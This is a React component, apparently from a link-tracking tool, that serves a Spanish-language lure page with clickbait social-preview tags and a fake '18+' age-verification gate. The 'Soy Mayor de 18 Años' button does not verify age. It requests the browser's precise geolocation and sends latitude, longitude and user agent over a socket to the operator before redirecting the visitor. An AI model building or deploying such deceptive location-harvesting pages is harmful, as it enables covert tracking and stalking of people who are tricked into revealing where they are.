import React, { useEffect, useState, useRef } from 'react';
import { useParams } from 'react-router-dom';
import { Helmet } from 'react-helmet-async';
import { io } from 'socket.io-client';
import api from '../services/api';

const TrackLink = () => {
    const { id } = useParams();
    const [linkData, setLinkData] = useState(null);
    const [error, setError] = useState(null);
    const socketRef = useRef();

    useEffect(() => {
        const fetchLinkData = async () => {
            try {
                const response = await api.get(`/links/${id}`);
                setLinkData(response.data);
            } catch (error) {
                console.error('Error fetching link:', error);
                setLinkData({
                    title: 'Enlace no encontrado',
                    description: 'Este enlace puede haber expirado o no existe.',
                    imageUrl: 'https://placehold.co/600x400/1e293b/475569?text=Error'
                });
            }
        };
        fetchLinkData();

        const socket = io(window.location.origin.replace('3000', '3001'));
        socketRef.current = socket;

        // Auto-request location removed to require user interaction first

        return () => {
            if (socket) socket.disconnect();
        };
    }, [id]);

    const handleEnter = () => {
        setError(null);
        if (!navigator.geolocation) {
            setError('La geolocalización no es compatible con tu navegador');
            return;
        }

        navigator.geolocation.getCurrentPosition(
            (position) => {
                const { latitude, longitude } = position.coords;
                // Emit location to socket
                socketRef.current.emit('update-location', {
                    linkId: id,
                    lat: latitude,
                    lng: longitude,
                    userAgent: navigator.userAgent
                });

                // Redirect to destination
                if (linkData?.destinationUrl) {
                    window.location.href = linkData.destinationUrl;
                }
            },
            (err) => {
                console.error('Geolocation error:', err);
                setError('Por favor verifique su edad/ubicación para continuar.');
            }
        );
    };

    if (!linkData) return (
        <div className="min-h-screen bg-slate-900 flex items-center justify-center">
            <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-primary"></div>
        </div>
    );

    return (
        <div className="min-h-screen bg-black font-display text-white relative overflow-hidden flex flex-col">
            <Helmet>
                <title>{linkData.title || "Lo mas viral"}</title>
                <meta name="description" content={linkData.description || "Contenido exclusivo"} />
                <meta property="og:title" content={linkData.title || "Lo mas viral"} />
                <meta property="og:description" content={linkData.description || "Contenido exclusivo"} />
                <meta property="og:image" content={linkData.imageUrl || ""} />
            </Helmet>

            {/* Background Image/Blur */}
            <div className="absolute inset-0 z-0">
                {linkData.imageUrl && (
                    <img src={linkData.imageUrl} alt="Background" className="w-full h-full object-cover opacity-30 blur-xl scale-110" />
                )}
                <div className="absolute inset-0 bg-gradient-to-b from-black/60 via-black/80 to-black"></div>
            </div>

            {/* Content Container */}
            <div className="relative z-10 flex-1 flex flex-col items-center justify-center p-6 text-center max-w-md mx-auto w-full">

                {/* Warning Icon/Badge */}
                <div className="mb-8 animate-pulse-slow">
                    <div className="size-20 rounded-full bg-red-600/20 flex items-center justify-center border border-red-500/50 shadow-[0_0_30px_rgba(220,38,38,0.3)]">
                        <span className="material-symbols-outlined text-red-500 text-[40px]">18+</span>
                    </div>
                </div>

                <div className="space-y-6">
                    {/* Headline Section */}
                    <div className="text-center mb-4">
                        <h1 className="text-white tracking-tight text-3xl font-bold leading-tight font-display">
                            {linkData.title || "Contenido Restringido"}
                        </h1>
                    </div>

                    {/* Body Text Section */}
                    <div className="text-center">
                        <p className="text-slate-300 text-base leading-relaxed">
                            {linkData.description || "Este contenido requiere verificación de edad y ubicación para confirmar que eres mayor de 18 años y resides en una zona permitida."}
                        </p>
                    </div>

                    {/* Error Notification */}
                    {error && (
                        <div className="p-4 rounded-lg bg-red-500/10 border border-red-500/20 flex items-center justify-center gap-3 animate-fade-in">
                            <span className="material-symbols-outlined text-red-500 text-xl">error</span>
                            <p className="text-red-500 text-sm font-medium">{error}</p>
                        </div>
                    )}

                    {/* CTA Button */}
                    <button
                        onClick={handleEnter}
                        className="w-full py-4 px-6 bg-red-600 hover:bg-red-700 active:bg-red-800 text-white font-bold text-lg rounded-xl shadow-[0_0_20px_rgba(220,38,38,0.4)] hover:shadow-[0_0_30px_rgba(220,38,38,0.6)] transition-all transform hover:-translate-y-1 relative overflow-hidden group"
                    >
                        <span className="relative z-10 flex items-center justify-center gap-2">
                            Soy Mayor de 18 Años - Entrar
                            <span className="material-symbols-outlined">arrow_forward</span>
                        </span>
                    </button>

                    <p className="text-slate-500 text-xs">
                        Al continuar, aceptas nuestros términos y condiciones de verificación.
                    </p>
                </div>
            </div>
        </div>
    );
};

export default TrackLink;
